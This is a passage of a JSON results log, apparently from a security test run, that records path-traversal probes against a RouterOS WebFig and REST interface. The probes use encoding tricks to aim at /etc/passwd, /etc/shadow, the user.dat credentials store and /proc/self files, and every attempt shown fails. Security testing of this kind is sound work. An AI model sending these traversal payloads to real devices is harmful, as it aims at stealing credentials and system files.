+        "path": "/webfig/%ef%bc%8e%ef%bc%8e/%ef%bc%8e%ef%bc%8e/etc/passwd",
+        "path_hex": "2f7765626669672f2565662562632538652565662562632538652f2565662562632538652565662562632538652f6574632f706173737764",
+        "status_line": "HTTP/1.1 404 Not Found",
+        "status_code": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 47,
+      "category": "backslash",
+      "name": "Backslash: Backslash traversal ..\\..\\",
+      "description": "Backslash traversal ..\\..\\",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.309912",
+      "details": {
+        "path": "/webfig/..\\..\\etc\\passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 48,
+      "category": "backslash",
+      "name": "Backslash: Triple backslash traversal",
+      "description": "Triple backslash traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.313910",
+      "details": {
+        "path": "/webfig/..\\..\\..\\etc\\passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 49,
+      "category": "backslash",
+      "name": "Backslash: Mixed: ../ then ..\\",
+      "description": "Mixed: ../ then ..\\",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.317908",
+      "details": {
+        "path": "/webfig/../..\\etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 50,
+      "category": "backslash",
+      "name": "Backslash: Mixed: ..\\ then ../",
+      "description": "Mixed: ..\\ then ../",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.321906",
+      "details": {
+        "path": "/webfig/..\\../etc\\passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 51,
+      "category": "backslash",
+      "name": "Backslash: Alternating slash types",
+      "description": "Alternating slash types",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.325904",
+      "details": {
+        "path": "/webfig/..\\../..\\etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 52,
+      "category": "backslash",
+      "name": "Backslash: URL-encoded backslash (%5c)",
+      "description": "URL-encoded backslash (%5c)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.329902",
+      "details": {
+        "path": "/webfig/..%5c..%5cetc%5cpasswd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 53,
+      "category": "backslash",
+      "name": "Backslash: Uppercase encoded backslash (%5C)",
+      "description": "Uppercase encoded backslash (%5C)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.333900",
+      "details": {
+        "path": "/webfig/..%5C..%5Cetc%5Cpasswd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 54,
+      "category": "backslash",
+      "name": "Backslash: Double-encoded backslash (%255c)",
+      "description": "Double-encoded backslash (%255c)",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.333900",
+      "details": {
+        "path": "/webfig/..%255c..%255cetc%255cpasswd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 55,
+      "category": "long_path",
+      "name": "Long path: 255-char component + traversal",
+      "description": "255-char component + traversal",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=283",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.341896",
+      "details": {
+        "path_len": 283,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 56,
+      "category": "long_path",
+      "name": "Long path: 512-char component + traversal",
+      "description": "512-char component + traversal",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=540",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.345894",
+      "details": {
+        "path_len": 540,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 57,
+      "category": "long_path",
+      "name": "Long path: 1024-char component + traversal",
+      "description": "1024-char component + traversal",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=1052",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.349892",
+      "details": {
+        "path_len": 1052,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 58,
+      "category": "long_path",
+      "name": "Long path: 100 dirs deep then 103 levels up",
+      "description": "100 dirs deep then 103 levels up",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=938",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.353890",
+      "details": {
+        "path_len": 938,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 59,
+      "category": "long_path",
+      "name": "Long path: 300 dots then traversal",
+      "description": "300 dots then traversal",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=325",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.357888",
+      "details": {
+        "path_len": 325,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 60,
+      "category": "long_path",
+      "name": "Long path: 4093-char pad (near 4096 page boundary)",
+      "description": "4093-char pad (near 4096 page boundary)",
+      "result": "HTTP 404, body_len=99, traversal=False, path_len=4121",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.361886",
+      "details": {
+        "path_len": 4121,
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 61,
+      "category": "rest_traversal",
+      "name": "REST: REST ../../etc/passwd",
+      "description": "REST ../../etc/passwd",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.365884",
+      "details": {
+        "path": "/rest/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 62,
+      "category": "rest_traversal",
+      "name": "REST: REST ../../../etc/passwd",
+      "description": "REST ../../../etc/passwd",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.373880",
+      "details": {
+        "path": "/rest/../../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 63,
+      "category": "rest_traversal",
+      "name": "REST: REST /file/../../etc/passwd",
+      "description": "REST /file/../../etc/passwd",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.373880",
+      "details": {
+        "path": "/rest/file/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 64,
+      "category": "rest_traversal",
+      "name": "REST: REST encoded traversal",
+      "description": "REST encoded traversal",
+      "result": "HTTP 400, body_len=82, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.377878",
+      "details": {
+        "path": "/rest/%2e%2e/%2e%2e/etc/passwd",
+        "status": 400,
+        "body_len": 82,
+        "body_preview": "{\"detail\":\"no such command or directory (..)\",\"error\":400,\"message\":\"Bad Request\"}",
+        "matched_sigs": [],
+        "content_type": "application/json",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 65,
+      "category": "rest_traversal",
+      "name": "REST: REST encoded slash traversal",
+      "description": "REST encoded slash traversal",
+      "result": "HTTP 400, body_len=98, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.381876",
+      "details": {
+        "path": "/rest/..%2f..%2f..%2fetc/passwd",
+        "status": 400,
+        "body_len": 98,
+        "body_preview": "{\"detail\":\"no such command or directory (..%2F..%2F..%2Fetc)\",\"error\":400,\"message\":\"Bad Request\"}",
+        "matched_sigs": [],
+        "content_type": "application/json",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 66,
+      "category": "rest_traversal",
+      "name": "REST: REST file name param traversal",
+      "description": "REST file name param traversal",
+      "result": "HTTP 200, body_len=2, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.389872",
+      "details": {
+        "path": "/rest/file?name=../../etc/passwd",
+        "status": 200,
+        "body_len": 2,
+        "body_preview": "[]",
+        "matched_sigs": [],
+        "content_type": "application/json",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 67,
+      "category": "rest_traversal",
+      "name": "REST: REST file name user.dat",
+      "description": "REST file name user.dat",
+      "result": "HTTP 200, body_len=2, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.393870",
+      "details": {
+        "path": "/rest/file?name=../../../flash/rw/store/user.dat",
+        "status": 200,
+        "body_len": 2,
+        "body_preview": "[]",
+        "matched_sigs": [],
+        "content_type": "application/json",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 68,
+      "category": "rest_traversal",
+      "name": "REST: REST export file param",
+      "description": "REST export file param",
+      "result": "HTTP 400, body_len=64, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.397868",
+      "details": {
+        "path": "/rest/export?file=../../etc/passwd",
+        "status": 400,
+        "body_len": 64,
+        "body_preview": "{\"detail\":\"no such command\",\"error\":400,\"message\":\"Bad Request\"}",
+        "matched_sigs": [],
+        "content_type": "application/json",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 69,
+      "category": "rest_traversal",
+      "name": "REST: REST to WebFig cross-path",
+      "description": "REST to WebFig cross-path",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.405864",
+      "details": {
+        "path": "/rest/../webfig/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 70,
+      "category": "rest_traversal",
+      "name": "REST: REST double-slash traversal",
+      "description": "REST double-slash traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.409862",
+      "details": {
+        "path": "/rest//../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false,
+        "json_file_leak": false
+      }
+    },
+    {
+      "id": 71,
+      "category": "skin_theme",
+      "name": "Skin: Skin param with traversal",
+      "description": "Skin param with traversal",
+      "result": "HTTP 200, body_len=22450, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.417858",
+      "details": {
+        "path": "/webfig/?skin=../../etc/passwd",
+        "status": 200,
+        "body_len": 22450,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p",
+        "matched_sigs": [
+          "RouterOS"
+        ],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 72,
+      "category": "skin_theme",
+      "name": "Skin: Skin param to shadow",
+      "description": "Skin param to shadow",
+      "result": "HTTP 200, body_len=22450, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.425854",
+      "details": {
+        "path": "/webfig/?skin=../../../etc/shadow",
+        "status": 200,
+        "body_len": 22450,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p",
+        "matched_sigs": [
+          "RouterOS"
+        ],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 73,
+      "category": "skin_theme",
+      "name": "Skin: Lang param with traversal",
+      "description": "Lang param with traversal",
+      "result": "HTTP 200, body_len=22450, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.433850",
+      "details": {
+        "path": "/webfig/?lang=../../etc/passwd",
+        "status": 200,
+        "body_len": 22450,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p",
+        "matched_sigs": [
+          "RouterOS"
+        ],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 74,
+      "category": "skin_theme",
+      "name": "Skin: Lang param to proc/version",
+      "description": "Lang param to proc/version",
+      "result": "HTTP 200, body_len=22450, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.441846",
+      "details": {
+        "path": "/webfig/?lang=../../../proc/version",
+        "status": 200,
+        "body_len": 22450,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>RouterOS</title>\n<link href=\"/assets/style-ae67df160dad.css\" rel=\"stylesheet\">\n<link href=\"/favicon.png\" rel=\"icon\">\n<link href=\"/favicon.svg\" rel=\"icon\">\n<script>\n  if (location.pathname.endsWith(\"/webfig\")) location.href = \"/webfig/\";\n</script>\n<script src=\"curve255-541e54a862be.js\"></script>\n</head>\n<div id=\"startup\" class=\"startup\">Loading</div>\n\n<div id=\"p",
+        "matched_sigs": [
+          "RouterOS"
+        ],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 75,
+      "category": "skin_theme",
+      "name": "Skin: Skins directory traversal",
+      "description": "Skins directory traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.445844",
+      "details": {
+        "path": "/webfig/skins/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 76,
+      "category": "skin_theme",
+      "name": "Skin: CSS directory traversal",
+      "description": "CSS directory traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.453840",
+      "details": {
+        "path": "/webfig/css/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 77,
+      "category": "skin_theme",
+      "name": "Skin: JS directory traversal",
+      "description": "JS directory traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.457838",
+      "details": {
+        "path": "/webfig/js/../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 78,
+      "category": "skin_theme",
+      "name": "Skin: Icon path traversal",
+      "description": "Icon path traversal",
+      "result": "HTTP 404, body_len=99, traversal=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.461836",
+      "details": {
+        "path": "/webfig/mikrotik.ico/../../../etc/passwd",
+        "status": 404,
+        "body_len": 99,
+        "body_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "matched_sigs": [],
+        "content_type": "text/html",
+        "traversal_success": false
+      }
+    },
+    {
+      "id": 79,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS user credentials database",
+      "description": "RouterOS user credentials database -- traversal=/webfig/../../../flash/rw/store/user.dat, direct=/flash/rw/store/user.dat",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.461836",
+      "details": {
+        "traversal_path": "/webfig/../../../flash/rw/store/user.dat",
+        "direct_path": "/flash/rw/store/user.dat",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 80,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS user.dat (alt path)",
+      "description": "RouterOS user.dat (alt path) -- traversal=/webfig/../../../rw/store/user.dat, direct=/rw/store/user.dat",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.461836",
+      "details": {
+        "traversal_path": "/webfig/../../../rw/store/user.dat",
+        "direct_path": "/rw/store/user.dat",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 81,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS nova environment config",
+      "description": "RouterOS nova environment config -- traversal=/webfig/../../../nova/etc/environment, direct=/nova/etc/environment",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.493820",
+      "details": {
+        "traversal_path": "/webfig/../../../nova/etc/environment",
+        "direct_path": "/nova/etc/environment",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 82,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS nova init script",
+      "description": "RouterOS nova init script -- traversal=/webfig/../../../nova/etc/init, direct=/nova/etc/init",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.505814",
+      "details": {
+        "traversal_path": "/webfig/../../../nova/etc/init",
+        "direct_path": "/nova/etc/init",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 83,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS MPD configuration",
+      "description": "RouterOS MPD configuration -- traversal=/webfig/../../../nova/etc/mpd.conf, direct=/nova/etc/mpd.conf",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.513810",
+      "details": {
+        "traversal_path": "/webfig/../../../nova/etc/mpd.conf",
+        "direct_path": "/nova/etc/mpd.conf",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 84,
+      "category": "routeros_paths",
+      "name": "ROS path: RouterOS system log file",
+      "description": "RouterOS system log file -- traversal=/webfig/../../../rw/logs/LOG, direct=/rw/logs/LOG",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.517808",
+      "details": {
+        "traversal_path": "/webfig/../../../rw/logs/LOG",
+        "direct_path": "/rw/logs/LOG",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 85,
+      "category": "routeros_paths",
+      "name": "ROS path: Process command line (www binary path)",
+      "description": "Process command line (www binary path) -- traversal=/webfig/../../../proc/self/cmdline, direct=/proc/self/cmdline",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.529802",
+      "details": {
+        "traversal_path": "/webfig/../../../proc/self/cmdline",
+        "direct_path": "/proc/self/cmdline",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 86,
+      "category": "routeros_paths",
+      "name": "ROS path: Process memory map (ASLR defeat)",
+      "description": "Process memory map (ASLR defeat) -- traversal=/webfig/../../../proc/self/maps, direct=/proc/self/maps",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.541796",
+      "details": {
+        "traversal_path": "/webfig/../../../proc/self/maps",
+        "direct_path": "/proc/self/maps",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "direct_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
+        "traversal_sigs": [],
+        "direct_sigs": [],
+        "traversal_success": false,
+        "direct_success": false
+      }
+    },
+    {
+      "id": 87,
+      "category": "routeros_paths",
+      "name": "ROS path: Process environment variables",
+      "description": "Process environment variables -- traversal=/webfig/../../../proc/self/environ, direct=/proc/self/environ",
+      "result": "Traversal: HTTP 404 (len=99), Direct: HTTP 404 (len=99), traversal_success=False, direct_success=False",
+      "anomaly": false,
+      "timestamp": "2026-02-16T14:08:26.553790",
+      "details": {
+        "traversal_path": "/webfig/../../../proc/self/environ",
+        "direct_path": "/proc/self/environ",
+        "traversal_status": 404,
+        "direct_status": 404,
+        "traversal_body_len": 99,
+        "direct_body_len": 99,
+        "traversal_preview": "<!doctype html>\n<html lang=en>\n<title>Error 404 : Not Found</title>\n<h1>Error 404 : Not Found</h1>\n",
